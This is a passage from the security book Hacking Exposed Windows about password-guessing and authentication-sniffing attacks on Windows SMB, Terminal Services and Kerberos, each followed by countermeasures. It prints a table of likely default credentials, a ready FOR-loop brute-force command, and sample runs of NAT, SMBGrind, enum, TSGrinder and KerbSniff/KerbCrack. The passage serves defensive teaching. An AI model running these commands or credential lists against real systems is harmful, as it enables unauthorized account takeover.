the password policy. Also practice good password  practices on all the accounts.   Chapter 5:  Hacking Windows-Specific Services   121  The Importance of Administrator and Service Accounts  We  identify  a  number  of  username password  combinations  in  this  chapter,  including  many  for  the  all-powerful  Administrator  account.  We  cannot  emphasize  enough  the  importance  of  protecting  this  account.  One  of  the  most  effective  Windows  domain  exploitation techniques we have encountered in our consulting experience involves the  compromise of a single machine within the domain—usually, in a large domain, where a  system  with  a  NULL,  or  weak,  Administrator  password  can  be  found  reliably,  even  though this problem is handled quite effectively nowadays and low-hanging fruits are  starting to appear elsewhere. Once this system is compromised, an experienced attacker  will  upload  the  tools  of  the  trade,  most  likely  including  the  old  lsadump2,  or  similar  extraction tool discussed in Chapter 7. The lsadump2 tool will extract passwords from  LSA Secrets storage for domain accounts that log on as a service, another common practice  in Windows domains. After this password has been obtained, it is usually a trivial matter  to compromise the domain controller s  by logging in as the service account.  In addition, consider this fact: Since normal users tend to change their passwords  according to a fairly regular schedule  per security policy , chances are that guessing  regular  user  account  passwords  might  be  difficult—and  guessing  a  correct  password  obtains only user-level access.  Hmmmm. Whose accounts rarely change their passwords? Administrators! And unless  an  effective  housekeeping  management  practice  is  in  place,  they  tend  to  use  the  same  password across many servers, including their own workstations. Backup accounts and  service  accounts  also  tend  to  change  their  passwords  infrequently.  Since  all  of  these  accounts are usually highly privileged and tend not to change their passwords as frequently  as users, they are the accounts targeted when attackers perform password guessing.  Remember that no system is an island in a Windows domain, and it can take only one   poorly chosen password to unravel the security of your entire Windows environment.  Now  that  we’ve  gotten  some  housekeeping  out  of  the  way,  let’s  discuss  some   password-guessing attack tools and techniques.  Manual Password Guessing  Popularity: Simplicity: Impact:  Risk Rating:  10 9 5 8  Once Windows authentication services have been identified by a port scan and shares  enumerated, it’s hard to resist an immediate password guess  or 10  using the command- line net use command. It’s as easy as this: C:\>net use \\victim\ipc$ password  u:victim\username System error 1326 has occurred.  Logon failure: unknown user name or bad password.   122   Hacking Exposed Windows: Windows Security Secrets & Solutions   Note that we have used the fully qualified username in this example, victim\username, explicitly identifying the account we are attacking. Although this is not always necessary,  it can prevent erratic results in certain situations, such as when net use commands are  launched from a command shell running as LocalSystem.  The effectiveness of manual password guessing is either close to 100 percent or nil,  depending on how much information the attacker has collected about the system and  whether the system has been configured with one of the high probability username  password combinations listed in Table 5-1.  Note  in  Table  5-1  that  we  have  used  lowercase  for  all  passwords—since  modern  Windows passwords are case-sensitive, case variations on the above passwords may also  prove  effective   by  contrast,  usernames  are  case-insensitive .  Needless  to  say,  these  combinations should not appear anywhere within your infrastructure, or you will likely  become a victim sometime soon.  We will discuss countermeasures later in the section “Countermeasures to Password Guessing.”  Account Name Administrator, admin, root NULL, password, administrator, admin, root,   High Probability Passwords  test, lab, demo  username backup  arcserve tivoli symbiator backupexec  system, machine_name, domain_name, workgroup_ name, or combination of those, combination of system  name, location, etc. NULL, test, lab, password, temp, share, write,  full, both, read, ﬁ les, demo, test, access, user,  server, local, machine_name, domain_name, workgroup_name NULL, welcome, username, company_name backup, system, server, local, machine_name, domain_name, workgroup_name arcserve, backup tivoli, tmesrvd symbiator, as400 backup, arcada  Table 5-1  High Probability Username Password Combinations   Chapter 5:  Hacking Windows-Specific Services   123  Dictionary Attacks  Popularity: Simplicity: Impact:  Risk Rating:  8 9 7 8  As the fabled John Henry figured out in his epic battle with technology  represented  by  the  steel  driving  machine ,  human  faculties  are  quickly  overwhelmed  by  the  unthinking,  unfeeling  onslaught  of  automated  mechanical  processes.  Same  goes  for  password  guessing—a  computer  is  much  better  suited  for  such  a  repetitive  task  and  brings such massive efficiency to the process that it quickly overwhelms human password  selection habits. A number of methods are available for automating password guessing  against SMB, which we discuss in sequence here. For  example,  it  is  quite  easy  to  implement  a  logon  brute  forcer  using  the  Win32  functionWNetAddConnection2. This API is well documented in MSDN  see “References  and  Further  Reading” .  Following  is  some  pseudocode  showing  how  a  simple  logon  brute forcer might be built using WNetAddConnection2: OpenFile "passwords.txt"  ReadNextPassword LineFromFile  If EOF  then exit WNetAddConnection2 resource, LineFromFile,"Administrator",0  if Status == STATUS_SUCCESS  print "password is:",LineFromFile else goto 20 exit  A similar approach can be used for any other API calls, either from Microsoft or third- party vendors who provide libraries to build clients for the product they sell.  The speed with so-called “logon cracking,” which means attempting to find valid  username and password pairs by using native logon mechanisms to establish the session,  is  dependent  on  the  Windows  version.  For  Windows  2000,  Microsoft  rewrote  SMB  redirector, which enabled higher speed networks but also benefited attackers by offering  higher speed cracking—even when using W2K as a proxy for NT4. This is a good example  of well-intentioned performance improvement that has potential negative repercussions  when used for malicious purposes. FOR loops  The simplest way to automate password guessing is to use the simple FOR command built into the Windows console. This can hurl a nearly unlimited number of  username password guesses at a remote system with Windows authentication services  available. If you are the administrator of such a system, you may find yourself in John  Henry’s shoes someday. Here’s how the FOR loop attack works.   124   Hacking Exposed Windows: Windows Security Secrets & Solutions   First, create a text file with space- or tab-delimited username password pairs. Such   a file might look like the following example, which we’ll call credentials.txt: [file: credentials.txt] administrator "" administrator password administrator administrator  …  This file will serve as a dictionary from which the main FOR loop will draw usernames  and  passwords  as  it  iterates  through  each  line  of  the  file.  The  term  dictionary  attack describes the generic usage of precomputed values to guess passwords or cryptographic  keys,  as  opposed  to  a  brute-force  attack,  which  generates  random  values  rather  than  drawing them from a precomputed table or file. Then, from a directory that can access credentials.txt, run the following commands,  which have been broken into separate lines using the special ^ character to avoid having  to type the entire string of commands at once: C:\>FOR  F "tokens=1,2*" %i in  credentials.txt ^ More? do net use \\victim.com\IPC$ %j  u:victim.com\%i^ More? More? More?  2>\>nul^ && echo %time% %date% >\> outfile.txt^ && echo \\victim.com acct: %i pass: %j >\> outfile.txt   Make sure to prepend a space before lines 3, 4, and 5, but not line 2.   Let’s walk through each line of this set of commands to see what it does:    Line 1  Open credentials.txt, parse each line into tokens delimited by a space  or tab, and then pass the ﬁ rst and second tokens to the body of the FOR loop as  variables %i and %j for each iteration  username and password, respectively .   Line 2  Loop through a net use command, inserting the %i and %j tokens in   place of username and password, respectively.    Line 3  Redirect stderr to nul so that logon failures don’t get printed to   screen  to redirect stdout, use 1>\> .    Line 4  Append the current time and date to the ﬁ le outﬁ le.txt.   Line 5  Append the server name and the successfully guessed username and   password tokens to outﬁ le.txt.  After these commands execute, if a username password pair has been successfully   guessed from credentials.txt, the outfile.txt will exist and will look something like this: C:\>type outfile.txt 11:53:43.42 Wed 05 09 2001 \\victim.com acct: administrator pass: ""  The attacker’s system will also have an open session with the victim server:   Chapter 5:  Hacking Windows-Specific Services   125  C:\>net use New connections will not be remembered.  Status       Local     Remote                Network ---------------------------------------------------------------------- OK                     \\victim.com\IPC$     Microsoft Windows Network The command completed successfully.  This simple example is meant only as a demonstration of one possible way to perform  password guessing using a FOR loop. Clearly, this concept could be extended further,  with input from a port scanner  see Chapter 3  to preload a list of viable Windows servers  from adjacent networks, error checking, and so on. Nevertheless, the main point here is  the ease with which password-guessing attacks can be automated using only built-in  Windows commands.  One  drawback  to  using  command-line net  use  commands  is  that  each  command  creates  a  connection that appears as a separate log entry on the target host. When using the Windows GUI to  authenticate, password guesses are done within the same session and show up only as only a  single connection entry in the logs.  192.168.202.%i >\> nat_output.txt  NAT—the  NetBIOS  Auditing  Tool  NAT  is  a  freely  available  compiled  executable  that  performs SMB dictionary attacks, one target at a time. It operates from the command  line, however, so its activities can be easily scripted. NAT will connect to a target system  and then attempt to guess passwords from a predefined array and user-supplied lists.  One drawback to NAT is that once it guesses a proper set of credentials, it immediately  attempts  access  using  those  credentials.  Thus,  additional  weak  passwords  for  other  accounts are not found. The following example shows a simple FOR loop that iterates  NAT through a Class C subnet. The output has been edited for brevity. D:\>FOR  L %i IN  1,1,254  DO nat -u userlist.txt -p passlist.txt [*]--- Checking host: 192.168.202.1 [*]--- Obtaining list of remote NetBIOS names [*]--- Attempting to connect with Username: 'ADMINISTRATOR' Password:       'ADMINISTRATOR' [*]--- Attempting to connect with Username: 'ADMINISTRATOR' Password:       'GUEST' … [*]--- CONNECTED: Username: 'ADMINISTRATOR' Password: 'PASSWORD' [*]--- Attempting to access share: \\*SMBSERVER\TEMP [*]--- WARNING: Able to access share: \\*SMBSERVER\TEMP [*]--- Checking write access in: \\*SMBSERVER\TEMP [*]--- WARNING: Directory is writeable: \\*SMBSERVER\TEMP [*]--- Attempting to exercise .. bug on: \\*SMBSERVER\TEMP . . .   126   Hacking Exposed Windows: Windows Security Secrets & Solutions   NAT is a fast and effective password-guessing tool if quality username and password  lists are available. If SMB enumeration has been performed successfully, the username  list is truly easy to come by.  -u userlist.txt -p passlist.txt -l 20 -v  SMBGrind NAT is free and generally gets the job done. For those who want commercial- strength password guessing, Network Associates’ old  no longer in existence  CyberCop  Scanner application came with a utility called SMBGrind that is extremely fast, because  it can set up multiple grinders running in parallel. Otherwise, it is not much different  from NAT. Some sample output from the command-line version of SMBGrind is shown  next. The –l in the syntax specifies the number of simultaneous connections—that is,  parallel grinding sessions. If -u and -p are not specified, SMBGrind defaults to NTuserlist  .txt and NTpasslist.txt, respectively. C:\>smbgrind -i 192.168.234.24 -r victim Host address: 192.168.234.240 Userlist    : userlist.txt Passlist    : passlist.txt Cracking host 192.168.234.240  victim  Parallel Grinders: 20 Percent complete: 0 Trying:   administrator Trying:   administrator        password Trying:   administrator   administrator Trying:   administrator            test .. .

Note that SMBGrind is capable of guessing multiple accounts within one session  here  it nabbed administrator and ejohnson , and it continues to guess each password in the  list even if it finds a match before the end  as it did with the Administrator account .  This may produce unnecessary log entries, since once the password is known, there’s  no sense in continuing to guess for that user. However, SMBGrind also forges event log  entries, so all attempts appear to originate from domain CYBERCOP, workstation \\ CYBERCOP in the remote system’s Security Log if auditing has been enabled. One of  these days, Microsoft will update the Windows Event Logs so that they can track IP  addresses.  Enum’s -dict Option  We first discussed the enum tool in Chapter 4, where we noted that  it had the ability to perform SMB dictionary attacks. Here’s an example of enum running  such an attack against a Windows 2000 system: C:\>enum -D -u administrator -f Dictionary.txt mirage username: administrator dictfile: Dictionary.txt server: mirage  1  administrator  return 1326, Logon failure: unknown user name or bad password.  2  administrator  password [etc.]  10  administrator  nobody return 1326, Logon failure: unknown user name or bad password.  11  administrator  space return 1326, Logon failure: unknown user name or bad password.  12  administrator  opensesame password found: opensesame  Following a successfully guessed password, you will find that enum has authenticated  to the IPC$ share on the target machine. Enum is really slow at SMB grinding, but it is  accurate.  Our experience with false negatives is minimal.   Grinding  WMI  with  Venom  As  we  briefly  mentioned  earlier  regarding  the  usage  of  integrated  authentication,  SMB  is  not  the  only  venue  you  can  use  to  attempt  logon  cracking.  Microsoft  introduced  the  Windows  Management  Instrumentation   WMI   interface mainly for managing systems. As this interface also supports login, it is very  useful as a basis for logon cracking tools. One such tool is called Venom  see “References  and Further Reading” . Using Venom against a Vista system is illustrated in Figure 5-1.   128   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 5-1  The Venom tool for performing Windows logon cracking via WMI  Countermeasures to Password Guessing The best solution to password guessing is to block access to or disable Windows authentication  services, as discussed in Chapter 4.  Assuming that SMB can’t be blocked or disabled outright, we discuss some of the  other available countermeasures next. Nearly all of the features discussed are accessible  via  Windows’  Security  Policy  MMC  snap-in,  which  can  be  found  within  the  Administrative Tools. Security Policy is discussed in more detail in Chapter 12.  Enforcing  Password  Complexity   passfilt   We  cannot  overemphasize  the  importance  of  selecting  strong,  difficult-to-guess  passwords,  especially  for  Windows  authentication  services. It takes only one poorly chosen password to lay an entire organization wide  open  and we’ve seen it plenty of times . Since NT 4 Service Pack 2, Microsoft’s most  advanced operating system has provided a facility to enforce complex passwords across  single systems or entire domains. Formerly called passfilt after the dynamic link library   DLL  that bears its name, the password filter can now be set under the Security Policy  applet   see  Chapter  12   under  the  Passwords  Must  Meet  Complexity  Requirements  option, as shown in Figure 5-2.  As with the original passfilt, setting this option to Enabled will require that passwords  be at least six characters long, may not contain a username or any part of a full name, and  must contain characters from at least three of the following:     English uppercase letters  A, B, C...Z     English lowercase letters  a, b, c...z    Chapter 5:  Hacking Windows-Specific Services   129  Figure 5-2  Enabling the Windows Server 2008 password ﬁ lter enforces strong password selection.     Westernized Arabic numerals  0, 1, 2...9     Non-alphanumeric metacharacters  @, , !, &, and so on   The  Password  Must  Meet  Complexity  Requirements  option  has  been  available  in  the  security policy since Windows 2000. Windows Vista and Windows Server 2008 further  enhance this option by allowing requirements to be targeted to specific groups.  The passfilt.dll file is no longer required on newer Windows systems—it’s all done through this Security  Policy setting.  NT 4’s passfilt had two limitations: the six-character length requirement was hard- coded, and it filtered only user requests to change passwords. Administrators could still  set weak passwords via console tools, circumventing the passfilt requirements. Both of  these issues are easy to address. First, manually set a minimum password length using  Security  Policy.   We  recommend  seven  characters  per  the  discussion  in  Chapter  7.   Second, the Windows password filter should be applied to all password resets, whether  set from the console or remotely.  Custom passfilt DLLs can also be developed to match the password policy of any  organization more closely.  See the “References and Further Reading” section at the end  of  the  chapter.   Be  aware  that  Trojan  passfilt  DLLs  would  be  in  a  perfect  position  to  compromise security, so carefully vet third-party DLLs.  For highly sensitive accounts like the true Administrator and service accounts, we  also  recommend  incorporating  nonprinting ASCII  characters.  These  make  passwords  extraordinarily hard to guess. This measure is designed more to thwart offline password- guessing  attacks   for  example,  cracking ,  which  will  be  discussed  in  more  depth  in  Chapter 7.   130   Hacking Exposed Windows: Windows Security Secrets & Solutions   Regardless of different filters available for ensuring the password complexity, it is  good practice to advocate the usage of passphrases. A passphrase is a phrase used instead  of a simple password, as the name implies, and typically can be remembered better by  the users than complex passwords. For example, Hacking Exposed Windows 2003, edition  n! is easier to remember and harder to crack than Hk1nXpdw2k3. Links to more information  on passphrases can be found in the “References and Further Reading” section.  Account Lockout  Another critical factor in blocking password guessing is to enable an  account lockout threshold, although some organizations find this difficult to support  as we  will discuss momentarily . Account lockout will disable an account once the threshold  has  been  met.  Figure  5-3  shows  how  account  lockout  can  be  enabled  using  Security  Policy. Unless account lockout is set to a reasonably low number  we recommend 5 ,  password  guessing  can  continue  unabated  until  the  intruder  gets  lucky  or  until  he  compiles a large enough dictionary file, whichever comes first.  Interestingly,  Windows  maintains  a  record  of  failed  logins  even  if  the  lockout  threshold  has  not  been  set.   A  tool  such  as  UserDump  from  Chapter  4  will  show  the  number of failed logins and the last failed login date via null session, if available.  If  account lockout is subsequently enabled, it examines all accounts and locks out those  that have exceeded the threshold within the last Y minutes  where Y is the number of  minutes you set in the account lockout policy . This is a more secure implementation,  since it enables the lockout threshold to take effect almost instantaneously, but it may  cause some disruption in the user community if a lot of accounts have previous failed  logons that occurred within the lockout threshold window  although this is probably a  rare occurrence .  Thanks to Eric Schultze for bringing this behavior to our attention.   Some  organizations  we’ve  worked  with  as  security  consultants  have  resisted  implementing lockout thresholds. Since only select administrative groups can re-enable   Figure 5-3  Setting an account lockout threshold using Security Policy   Chapter 5:  Hacking Windows-Specific Services   131  a locked-out account, most companies observe a converse relationship between a lower  lockout threshold and higher help desk support costs and thus choose not to impose  such a burden on their users, support staff, and financial resources. We think this is a  mistake, though, and we advise that you spend the effort to find the magic number of  lockouts  that  your  organization  can  tolerate  without  driving  support  staff  mad.  Remember  that  even  seemingly  absurd  thresholds  can  prevent  wanton  password  guessing.  We’ve even seen organizations implement 100-count thresholds!  You can also  play with the account lockout duration and automatic reset duration  also configured in  Security Policy  to alleviate some burden here.  That  said,  account  lockout  thresholds  create  the  potential  for  a  denial-of-service  condition, whether accidentally or intentionally. A common scenario exists when service  accounts that get locked out when passwords expire on the domain  accidental , or when  a disgruntled employee attempts to log on using the account names of coworkers and  known  bogus  passwords  intentionally  to  frustrate  fellow  employees.  Use  this  option  with care, and make sure your choice works well in your particular environment.  Enable Auditing of Logon Failure Events  Dust off that handy-dandy Security Policy applet  once again and enable auditing of Logon and Account Logon event failure  at a minimum ,  as shown in Figure 5-4.  This is a minimum recommendation, as it will capture only failed logon events  that  may  be  indicative  of  password-guessing  attacks.  Failed  logons  will  appear  as  Event ID 529  failed logon event  and 681  failed account logon event  in the Security  Log. Account locked-out events have the ID 539. We discuss auditing in more general  terms in Chapter 6. Remember that before Windows Vista, the Event Log tracked only  the NetBIOS machine name of the offending system, not its IP address, limiting your  ability to track password-guessing activity.  Figure 5-4  Enabling auditing of logon failure events can provide indication of password-guessing  attacks.   132   Hacking Exposed Windows: Windows Security Secrets & Solutions   Windows records success of account logon events and logon events by default.  Review the Event Logs!  Remember that simply auditing logon events is not an effective  defense against intrusions—logs must be periodically reviewed if the entries generated  by these settings are to have any meaning. In a large environment, reviewing the logs  even on a monthly basis can be a Herculean task. Seek out automated log monitoring  and reporting tools to perform this task for you. We recommended these products:    Event Log Monitor  ELM  from TNT Software  ELM consolidates all Event  Logs to a central repository in real time, to provide correlation of all events in  one data source. An agent must be installed on each machine to be monitored.    EventAdmin from Aelita Software, nowadays from Quest Software   EventAdmin performs much the same functions as ELM, without requiring an  agent on each machine.   Links  to  each  of  these  company’s  websites  are  listed  in  the  “References  and  Further  Reading” section at the end of this chapter.   You can also gain insight, knowledge, and thereby control over your networks by  using security event and information management systems  SEM or SIEM , which supply  information  from  different  log  sources,  such  as  operating  systems,  routers,  firewalls,  intrusion detection systems, and intrusion protection systems. To build good fences, you  need to know what you need to protect in the first place.  Disable  the True  Administrator  Account  and  Create  a  Decoy  The  Administrator  account  is  especially  problematic  when  it  comes  to  password-guessing  attacks.  First,  it  has  a  standard name that is widely known—intruders are usually assured that they at least  have the account name correct when they attack this account. Changing the name affords  some protection, but it’s not foolproof—we’ve already shown in Chapter 4 how creative  enumeration  techniques  can  determine  the  true  Administrator  name.  Second,  the  Administrator account is not subject to account lockout settings by default on Windows  Server  2003  and  prior  versions,  no  matter  what  account  lockout  settings  have  been  configured.  This  means  that  an  unlimited  number  of  password  guesses  can  be  made  against the Administrator account without lockout, if the account is configured poorly.  It is debatable how much value renaming the Administrator account provides from  a security perspective, since the true Administrator can always be identified by its SID if  enumeration is possible, no matter what name it carries  see Chapter 4 . However, we  recommend  that  the  built-in Administrator  account  be  used  only  when  it’s  explicitly  needed, such as for performing local administrative tasks when the domain is unavailable.  If it is possible to disable or rename the account  which is the default case on modern  versions of Windows including XP and later , we recommend it. Everything that takes  away known information from the attacker is good.  We recommend that a decoy Administrator account be set up to look exactly like the  true  Administrator  account.  This  will  quickly  identify  lowbrow  password-guessing  attacks in the logs. Do not make the fake Administrator a member of any groups, and  make sure to fill in the account’s Description field with the appropriate value—Built-in   Chapter 5:  Hacking Windows-Specific Services   133  account  for  administering  the  computer domain.  As  for  disabling  the  true  Administrator  account, Windows versions starting with XP permit renaming and disabling this account  using Security Policy  secpol.msc .  When it comes to account lockout, the built-in Administrator has always been a juicy  target  because  it  is  not  subject  to  the  system  account  lockout  policy  by  default.   For  example, Administrator will not become locked out no matter how many bad password  guesses are made.  The NT 4 Resource Kit included a utility called passprop that could  be  used  to  configure  account  lockout  for  the  true  Administrator  account   RID  500 .  Passprop changes the default behavior so that the Administrator account can become  locked out just like any other account after the prescribed number of bad guesses.  The  true Admin account will always be able to log in interactively.  The passprop tool quit  working under Windows 2000 up to Service Pack 2  even though it appears to work .  Later Windows versions can achieve the same goal by settings available as part of the  local security policy, which can be enforced using Group Policy in domain scenarios. In  a Vista stand-alone installation, the built-in Administrator account is disabled and, as in  Windows XP, requires Registry modification to make the account selectable in the logon  screen.  Running passprop to set Administrator lockout is easy:  C:\>passprop  adminlockout Password must be complex The Administrator account may be locked out except for interactive logons on a domain controller.  To be extra secure, manually remove the Access This Computer From The Network  privilege from the true Administrator account. This ensures that the true Admin account  will not be able to access the system remotely. If Admin has been renamed, this will be  doubly difficult for attackers to figure out.  Get  the  passprop  tool  from  the  Windows  2000  Server  Resource  Kit;  it  is  not  included  in  the  Professional kit.  Disable Idle Accounts  We’ve found that the toughest organizations to break into are those  that use account lockout as well as account expiration. Contractors, consultants, or other  temporary workers who are hired for only a short period should be given accounts that  are configured to expire after a set amount of time. You should also do the same with  accounts  used  for  temporary  activities  such  as  migrations.  This  assures  the  system  administrator that the account will be disabled when the temp work is completed and  the account is no longer necessary, as opposed to when the human resources department  gets around to telling someone to disable or delete the account after a few months  or  years, depending on the efficiency of the HR department . If the temporary work contract  gets extended, the account can be re-enabled, again for a set period of time. Organizations  that implement this policy can be much more difficult to break into by guessing passwords  for user accounts, since there are fewer accounts to target at any one time. Moreover, the  accounts that are weeded out are typically those with the worst passwords—temporary  accounts!   134   Hacking Exposed Windows: Windows Security Secrets & Solutions   Account expiration can be set on Windows domain controllers on the properties of a   user account, Account tab, under Account Expires, as shown in Figure 5-5.  Vet  Administrative  Personnel  Carefully  Remember  that  not  everything  can  be  defended  using technical configuration settings. When hiring personnel who require administrative  privileges,  make  sure  that  strict  hiring  policies  and  background  checks  have  been  performed  before  granting  those  privileges.  Members  of  the  highly  privileged  administrative groups under Windows can wipe out logs and otherwise hide their tracks  so  that  it  is  nearly  impossible  to  track  their   mis deeds. Assign  each  administrator  a  separate account to enable logging of individual activities, and don’t make that account  name  guessable   using  a  name  like  admin .  Remember  that  the  username password  pairs for administrative accounts are the keys to your Windows kingdom—make sure  those keys are secure.  You could also require highest privileged administrative accounts to use smart cards  for managing the systems. As a vector, all admin users’ normal accounts could use them  as well.  Figure 5-5  The Guest Properties window of a user account shown on a Windows Server 2003  domain controller. Note that account expiration can be set in the lower half of the screen.   Chapter 5:  Hacking Windows-Specific Services   135  Prevent  Creation  of  Administrative  Shares  Although  it’s  somewhat  minor,  preventing  creation  of  administrative  shares   C$,  ADMIN$   on  Windows  2000  and  Windows  is  important enough to mention here. Intruders typically target these shares for password- guessing attacks, since they permit direct mounting of large portions of the system drive.  Here’s how to delete the administrative shares on Windows:        1.  Delete the ADMIN$ and all driveletter$ shares in the Computer Management   Control Panel, under Shared Folders\Shares.  2.  Create HKLM\System\CurrentControlSet\Services\LanmanServer\  Parameters\AutoShareServer  REG_DWORD  and set it to zero  0 .  Administrative shares will be deleted and will not be automatically re-created after   subsequent reboots.  This does not eliminate the IPC$ share; it is created by the Server service and can be deleted only by  disabling that service or by manually deleting the share using the net share command. Disabling  the Server service could be considered useful for workstations that do not generally need to share  resources to network, as the service can be enabled and the system remotely accessed via remote  management modules and by other means.  Terminal Server Password Guessing  Popularity: Simplicity: Impact: Risk Rating:  7 7 8 7  Microsoft’s  in-the-box  graphical  remote  administration  functionality  is  known  as  Terminal Services. Graphical data is transferred between the Terminal Services client and  server via Microsoft’s proprietary Remote Desktop Protocol  RDP , which operates over  TCP port 3389 by default.  Fortunately for the good guys, guessing passwords against Terminal Services is not  as easy as attacking Windows authentication directly. The initial logon screen presented  via a Terminal Services client is simply a bitmap of the remote logon screen—with no  logon APIs to call, a hacker must enter text in the appropriate location within the bitmap  to  log  on  successfully.  It  is  thus  difficult  to  programmatically  determine  the  session  screen contents to script a password-guessing attack.  One of the first public attempts to circumvent this obstacle was the TSGrinder tool by  Tim Mullen. Instead of attacking via the standard Win32 Terminal Services client, Tim  targeted Microsoft’s ActiveX-based Terminal Services Advanced Client  TSAC . Though  the ActiveX control is specifically designed to deny script access to the password methods,  the ImsTscNonScriptable interface methods can be accessed via vtable binding in C++.  This allows a custom interface to be written to the control so attackers can hammer away  at the Administrator account until the password is guessed. Tim encountered additional    136   Hacking Exposed Windows: Windows Security Secrets & Solutions   challenges in implementing this tool since announcing it first in 2001, but he managed to  release TSGrinder 2 at the Black Hat conference in Las Vegas in July 2003  the code is  available on Tim’s site at www.hammerofgod.com download.html . TSGrinder works  as advertised and is impressively fast considering it is essentially “typing” each guess  into the graphical Terminal Services client logon box. Here is a sample of a TSGrinder  session successfully guessing a password against a Windows Server 2003 system  the  graphical logon window appears in parallel with this command-line session : C:\>tsgrinder 192.168.234.244 password apple - failed password orange - failed password pear - failed password monkey - failed password racoon - failed password giraffe - failed password dog - failed password cat - failed password balls - failed password guessme - success!  TSGrinder takes command-line arguments for username, domain, a banner flag  in  case those pesky sysadmins attempt to throw a logon banner up before the logon dialog ,  multithreading, and multiple debug levels. Tim, it was worth the wait.  TS Password-Grinding Countermeasures If you are still debating setting an account lockout threshold after reading this chapter, it  should be a foregone conclusion if you run Terminal Services. Remember that if you use  Passprop to apply the threshold to the true Administrator account  RID 500 , this will not  affect interactive logon via Terminal Services, so assign a wickedly long and complex  password to the true Administrator account. In addition, all account logon events should  be logged  success and failure .  As  we  discussed  earlier  in  this  chapter,  we  also  recommend  renaming  the  local  Administrator account, especially on Terminal Services. The local Administrator account  is all-powerful on the local machine and cannot be locked out interactively. Since Terminal  Services login is by definition interactive, attackers can remotely guess passwords against  the Administrator  account  indefinitely.  Changing  the  name  of  the  account  presents  a  moving target to attackers  although the true Administrator account can be enumerated  via techniques discussed in Chapter 4 if services such as SMB or SNMP are available on  the target without proper configuration .  One way to discourage password-guessing attacks against Terminal Services is to  implement  a  custom  legal  notice  for  Windows  logon.  This  can  be  done  by  adding  or  editing the Registry values shown here: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon   Chapter 5:  Hacking Windows-Specific Services   137  Name LegalNoticeCaption LegalNoticeText  Data Type REG_SZ REG_SZ  Value [custom caption] [custom message]  Windows  will  display  the  custom  caption  and  message  provided  by  these  values  after users press CTRL-ALT-DEL and before the logon dialog box is presented, even when  logging  on  via  Terminal  Services.  It  is  not  clear  what  effect   if  any   this  will  have  on  password-grinding attacks such as those implemented by TSGrinder  we bet they are  derailed completely , but at least it will make malicious hackers work a little harder to  bypass that extra OK prompt.  Another  mitigation  for  password  guessing  is  to  obscure  exposure  of  what  port  Terminal Server listens to. This does not add protection for the actual server, but it means  that the attacker needs to connect specifically to a port with a client or raw connection to  figure out what protocol lies on the port. The change can be by modifying the following  Registry entry: Find the "PortNumber" subkey and notice the value of 00000D3D, hex for  3389 . Modify the port number in Hex and save the new value. HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp  Name PortNumber  Data Type  Value Port in hex  D3D is 3389   EAVESDROPPING ON WINDOWS AUTHENTICATION  Should  direct  password-guessing  attacks  fail,  an  attacker  can  attempt  to  obtain  user  credentials by eavesdropping on Windows logon exchanges. Many tools and techniques  are available for performing such attacks, and we discuss the most common ones in this  section:     Snifﬁ ng credential equivalents directly off the network wire    Capturing credential equivalents using a fraudulent server    Man-in-the-middle  MITM  attacks  “Sniffing” is a colloquial term for capturing and analyzing communications from a network. The term  was popularized by Network Associates’ Sniffer line of network monitoring tools. Nowadays Sniffer is  available from Network General.  Since  these  are  somewhat  specialized  attacks,  they  are  most  easily  implemented   using specific tools. Thus our discussion will be centered largely around these tools.  This section assumes familiarity with Windows LAN-oriented authentication protocols, including the  NTLM challenge-response mechanism, which are described in Chapter 2.   138   Hacking Exposed Windows: Windows Security Secrets & Solutions   Snifﬁ ng Kerberos Authentication Using KerbSniff KerbCrack  Popularity: Simplicity: Impact: Risk Rating:  5 3 9 6  Yes, you read it right: sniffing Kerberos. While the potential for eavesdropping on LM  NTLM authentication is widely known, it is much less widely appreciated that the same  thing can be done with Windows 2000 and later Kerberos domain logons using KerbSniff  KerbCrack tools from Arne Vidstrom at ntsecurity.nu, both located in the KerbCrack package.  In fact, we couldn’t believe it until we tested it and saw the data with our own eyes.  Only the initial request for a Ticket Granting Ticket  TGT  from the client to a Key Distribution Center   KDC  can be used in a brute-force or dictionary attack, since subsequent logins to various services  within the login session use random keys.  KerbSniff and KerbCrack work in tandem. KerbSniff sniffs the network and pulls  Kerberos domain authentication information, saving it to a user-specified output file  in  our example, output.txt , as shown here: C:\>kerbsniff output.txt KerbSniff 1.2 -  c  2002, Arne Vidstrom               - http:  ntsecurity.nu toolbox kerbcrack   Available network adapters:    0 - 192.168.234.34   1 - 192.168.234.33   2 - 192.168.208.1   4 - 192.168.223.1  Select the network adapter to sniff on: 1  Captured packets: * Press CTRL-C to end capture. The asterisk after Captured packets indicates the number  of logons that have been sniffed.  You can then use KerbCrack to perform brute-force or dictionary cracking operations  on the output file, revealing the passwords given enough time and computing horsepower   or a particularly large dictionary . We use the dictionary crack option in this example:   Chapter 5:  Hacking Windows-Specific Services   139  C:\>kerbcrack output.txt -d dictionary.txt KerbCrack 1.2 -  c  2002, Arne Vidstrom               - http:  ntsecurity.nu toolbox kerbcrack   Loaded capture file.  Currently working on:   Account name    - administrator  From domain     - VEGAS2  Trying password – admin  Trying password – guest  Trying password - root  Number of cracked passwords this far: 1  Done.  The last password guessed is the cracked password  in our example, root .  KerbCrack will crack only the last user entry made in the KerbSniff file; you will have to separate the  entries manually into different files if you want to crack each user’s password. Also, we’ve noted that  KerbSniff sometimes appends m or n to some account names. Other Kerberos crackers are listed in  “References and Further Reading.”  The  basis  for  this  attack  is  explained  in  a  paper  written  in  March  2002  by  Frank  O’Dwyer.  See “References and Further Reading” at the end of this chapter for a link.   Essentially,  the  Windows  Kerberos  implementation  sends  a  pre-authentication  packet  that contains a known plaintext  a timestamp  encrypted with a key derived from the  user’s  password.  Thus,  a  brute-force  or  dictionary  attack  that  decrypts  the  pre- authentication packet and reveals a structure similar to a standard timestamp unveils the  user’s password. This has been a known issue with Kerberos 5 for some time.  Countermeasures to Kerberos Snifﬁ ng In our testing, setting encryption on the secure channel  see Chapter 2  did not prevent  this attack, and Microsoft had issued no guidance on addressing this issue at the time of  this writing. Thus, you’re left with the classic defense: pick good passwords. O’Dwyer’s  paper notes that passwords of eight characters in length containing different cases and  numbers  would  take  an  estimated  67  years  to  crack  using  this  approach  on  a  single  Pentium 1.5GHz machine, so if you are using the Windows password complexity feature   mentioned  earlier  in  this  chapter ,  you’ve  bought  yourself  some  time   grin .  Also  remember that if a password is found in a dictionary, it will be cracked immediately.   140   Hacking Exposed Windows: Windows Security Secrets & Solutions   Snifﬁ ng LM Authentication  